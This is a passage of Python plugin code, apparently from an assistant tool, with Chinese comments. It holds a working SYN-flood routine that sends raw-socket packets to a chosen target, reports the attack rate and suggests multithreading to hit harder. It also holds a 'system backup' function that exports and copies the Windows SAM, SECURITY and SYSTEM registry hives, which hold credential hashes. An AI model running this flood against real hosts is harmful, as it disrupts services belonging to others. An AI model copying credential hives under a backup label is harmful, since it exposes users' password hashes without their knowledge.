            results.append(f"  攻击包数: {packet_count}")
            
            try:
                src_ip = get_local_ip()
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                sent = 0
                start_time = time.time()
                
                for i in range(packet_count):
                    src_port = random.randint(1024, 65535)
                    seq_num = random.randint(1000, 1000000)
                    packet = create_syn_packet(src_ip, target_ip, src_port, target_port, seq_num)
                    sock.sendto(packet, (target_ip, target_port))
                    sent += 1
                    
                    if sent % 100 == 0:
                        # 每100个包汇报一次
                        pass
                
                sock.close()
                
                elapsed = time.time() - start_time
                rate = sent / elapsed if elapsed > 0 else 0
                
                results.append(f"  [OK] 攻击完成")
                results.append(f"  发送包数: {sent}")
                results.append(f"  耗时: {elapsed:.2f} 秒")
                results.append(f"  平均速率: {rate:.1f} 包/秒")
                
                results.append("-" * 70)
                results.append("[攻击结果分析]")
                if rate > 100:
                    results.append("  [OK] 攻击速率较高，可能对目标造成影响")
                else:
                    results.append("  [!] 攻击速率较低，可能受网络或防火墙限制")
                
                results.append("  [建议] 提高 packet_count 或使用多线程攻击")
                results.append("  [防御] 目标应启用SYN Cookie防御")
                
            except PermissionError:
                results.append("  [ERROR] 需要管理员/root权限执行原始套接字攻击")
            except Exception as e:
                results.append(f"  [ERROR] 攻击失败: {e}")
            
            results.append("=" * 70)
            return "\n".join(results)
        
        return "\n".join(results)
        
    except Exception as e:
        return f"[ERROR] 执行失败: {e}"

# === from system_backup.plugin ===
def _system_backup(self, action: str, backup_type: str = "restore_point", backup_name: str = "", restore_target: str = "", include_paths: str = "", exclude_paths: str = "") -> str:
    """
    系统备份与还原 — 主人的数据永远安全
    """
    try:
        import os
        import shutil
        import subprocess
        import time
        import json
        import hashlib
        from datetime import datetime
        import zipfile
        import winreg
        
        # 备份根目录
        backup_root = os.path.join(os.environ.get('USERPROFILE', 'C:'), '.system_backups')
        os.makedirs(backup_root, exist_ok=True)
        
        # 备份清单
        manifest_file = os.path.join(backup_root, 'manifest.json')
        if not hasattr(self, '_backup_manifest'):
            if os.path.exists(manifest_file):
                try:
                    with open(manifest_file, 'r', encoding='utf-8') as f:
                        self._backup_manifest = json.load(f)
                except Exception as e:
                    self._backup_manifest = {}
            else:
                self._backup_manifest = {}
        
        def save_manifest():
            try:
                with open(manifest_file, 'w', encoding='utf-8') as f:
                    json.dump(self._backup_manifest, f, indent=2, ensure_ascii=False)
            except Exception as e:
                pass
        
        def get_backup_dir(name):
            return os.path.join(backup_root, name)
        
        def compute_hash(filepath):
            """计算文件SHA256"""
            try:
                sha256 = hashlib.sha256()
                with open(filepath, 'rb') as f:
                    for chunk in iter(lambda: f.read(8192), b''):
                        sha256.update(chunk)
                return sha256.hexdigest()
            except Exception as e:
                return None
        
        def zip_dir(source_dir, target_zip):
            """压缩目录"""
            try:
                with zipfile.ZipFile(target_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
                    for root, dirs, files in os.walk(source_dir):
                        for f in files:
                            file_path = os.path.join(root, f)
                            arcname = os.path.relpath(file_path, source_dir)
                            zf.write(file_path, arcname)
                return True
            except Exception as e:
                return False
        
        def create_restore_point(name):
            """创建系统还原点"""
            try:
                # 使用PowerShell创建还原点
                ps_cmd = f'''
                Checkpoint-Computer -Description "{name}" -RestorePointType MODIFY_SETTINGS
                '''
                result = subprocess.run(['powershell', '-NoProfile', '-Command', ps_cmd], 
                                      capture_output=True, text=True, timeout=30)
                if "失败" not in result.stdout:
                    return True, "还原点创建成功"
                return False, result.stdout.strip()
            except Exception as e:
                return False, str(e)
        
        def list_restore_points():
            """列出系统还原点"""
            try:
                ps_cmd = 'Get-ComputerRestorePoint | Select-Object SequenceNumber, CreationTime, Description'
                result = subprocess.run(['powershell', '-NoProfile', '-Command', ps_cmd], 
                                      capture_output=True, text=True, timeout=10)
                return result.stdout.strip()
            except Exception as e:
                return "无法获取还原点列表"
        
        def backup_registry():
            """备份注册表"""
            try:
                backup_dir = get_backup_dir(backup_name)
                os.makedirs(backup_dir, exist_ok=True)
                
                # 备份关键注册表项
                hives = [
                    ('HKLM', 'SYSTEM'),
                    ('HKLM', 'SOFTWARE'),
                    ('HKLM', 'SAM'),
                    ('HKLM', 'SECURITY'),
                    ('HKCU', '')
                ]
                
                for hive, subkey in hives:
                    if subkey:
                        reg_path = f'{hive}\\{subkey}'
                        _safe_subkey = subkey.replace("\\", "_")
                        reg_file = os.path.join(backup_dir, f'{hive}_{_safe_subkey}.reg')
                    else:
                        reg_path = hive
                        reg_file = os.path.join(backup_dir, f'{hive}.reg')
                    
                    cmd = f'reg export {reg_path} "{reg_file}" /y'
                    subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
                
                return True, f"注册表已备份到 {backup_dir}"
            except Exception as e:
                return False, str(e)
        
        def backup_system_files():
            """备份系统文件"""
            try:
                backup_dir = get_backup_dir(backup_name)
                os.makedirs(backup_dir, exist_ok=True)
                
                # 备份关键系统文件
                sys_files = [
                    (r'C:\Windows\System32\config\SYSTEM', 'config_SYSTEM'),
                    (r'C:\Windows\System32\config\SOFTWARE', 'config_SOFTWARE'),
                    (r'C:\Windows\System32\config\SAM', 'config_SAM'),
                    (r'C:\Windows\System32\config\SECURITY', 'config_SECURITY'),
                    (r'C:\Windows\System32\config\DEFAULT', 'config_DEFAULT'),
                    (r'C:\Windows\System32\drivers\etc\hosts', 'hosts'),
                ]
                
                backed = 0
                for src, name in sys_files:
                    if os.path.exists(src):
                        dst = os.path.join(backup_dir, name)
                        shutil.copy2(src, dst)
                        backed += 1
                
                # 压缩备份
                zip_path = os.path.join(backup_root, f'{backup_name}_system_files.zip')
                zip_dir(backup_dir, zip_path)
                shutil.rmtree(backup_dir, ignore_errors=True)
                
                return True, f"系统文件已备份到 {zip_path} ({backed} 个文件)"
            except Exception as e:
                return False, str(e)
        
        def backup_user_data():
            """备份用户数据"""
            try:
                backup_dir = get_backup_dir(backup_name)
                os.makedirs(backup_dir, exist_ok=True)
                
                # 用户数据路径
                user_dirs = [
                    os.path.expanduser('~/Desktop'),
                    os.path.expanduser('~/Documents'),
                    os.path.expanduser('~/Pictures'),
                    os.path.expanduser('~/Music'),
                    os.path.expanduser('~/Videos'),
                    os.path.expanduser('~/Downloads'),
                ]
                
                # 自定义包含路径
                if include_paths:
                    for path in include_paths.split(','):
                        path = path.strip()
                        if os.path.exists(path):
                            user_dirs.append(path)
                
                # 排除路径
                excludes = set()
                if exclude_paths:
                    for path in exclude_paths.split(','):
                        excludes.add(path.strip())
                
                total_size = 0
                for src in user_dirs:
                    if not os.path.exists(src):
                        continue
                    if src in excludes:
                        continue
                    name = os.path.basename(src)
                    dst = os.path.join(backup_dir, name)
                    if os.path.isdir(src):
                        shutil.copytree(src, dst, dirs_exist_ok=True, ignore=shutil.ignore_patterns('*.tmp', '*.cache', '*.log'))
                        total_size += sum(os.path.getsize(os.path.join(root, f)) for root, _, files in os.walk(dst) for f in files)
                    elif os.path.isfile(src):
                        shutil.copy2(src, dst)
                        total_size += os.path.getsize(src)
                
                # 压缩备份
                zip_path = os.path.join(backup_root, f'{backup_name}_user_data.zip')
                zip_dir(backup_dir, zip_path)
                shutil.rmtree(backup_dir, ignore_errors=True)
                
                size_mb = total_size / 1024 / 1024
                return True, f"用户数据已备份到 {zip_path} ({size_mb:.1f} MB)"
            except Exception as e:
                return False, str(e)
        
        # ================================================================
        # 主逻辑
        # ================================================================
        results = []
        results.append("=" * 70)
        results.append("[💾 系统备份与还原]")
        results.append(f"  时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        results.append(f"  操作: {action}")
        results.append("-" * 70)
        
        # === 创建备份 ===
        if action == "create":
            backup_id = backup_name or f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            results.append(f"  备份ID: {backup_id}")
            results.append(f"  备份类型: {backup_type}")
            results.append("-" * 70)
            
            success = False
            message = ""
            
            if backup_type == "restore_point":
                success, message = create_restore_point(backup_id)
                if success:
                    self._backup_manifest[backup_id] = {
                        'type': 'restore_point',
                        'time': datetime.now().isoformat(),
                        'message': message
                    }
                    save_manifest()
            
            elif backup_type == "registry":
                success, message = backup_registry()
                if success:
                    self._backup_manifest[backup_id] = {
                        'type': 'registry',
